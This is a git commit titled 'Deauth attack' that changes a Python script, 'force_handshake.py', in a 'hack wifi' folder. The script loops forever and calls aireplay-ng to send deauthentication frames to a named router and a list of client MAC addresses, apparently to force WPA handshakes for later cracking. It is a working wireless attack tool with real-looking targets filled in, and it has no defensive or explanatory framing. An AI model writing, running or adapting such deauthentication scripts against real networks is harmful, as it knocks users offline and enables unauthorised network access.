379ab5db2c58fd1bf85e79a2ef69c07021af7eee
Joao Paulo <joaopaulo.a.p@gmail.com>
2019-01-26 19:39:51 -0200

    Deauth attack

--- hack wifi/force_handshake.py
+++ hack wifi/force_handshake.py
@@ -1,15 +1,16 @@
 from os import system
 from time import sleep
 
-ROUTER_MAC = 'FC:6F:B7:E2:41:20'
-CLIENT_MAC = '04:D6:AA:8E:85:45'
+ROUTER_MAC = 'B0:4E:26:60:2C:86'
+CLIENT_MAC = ['C0:11:73:C7:2A:58','64:5A:04:52:CF:C0']
 INTERFACE = 'wlp0s18f2u3mon'
-ESSID = 'GVT-4120'
+ESSID = 'KALI'
 
-def aireplay():
+
+def deauth():
     while True:
-        system('aireplay-ng -0 2 -a {} -c {} -e {} {}'.format(ROUTER_MAC, CLIENT_MAC, ESSID, INTERFACE))
-        sleep(3)
+        for x in CLIENT_MAC:
+            system('aireplay-ng -0 2 -a {} -c {} -e {} {}'.format(ROUTER_MAC, x, ESSID, INTERFACE))
+            sleep(3)
 
-
-aireplay()
+deauth()
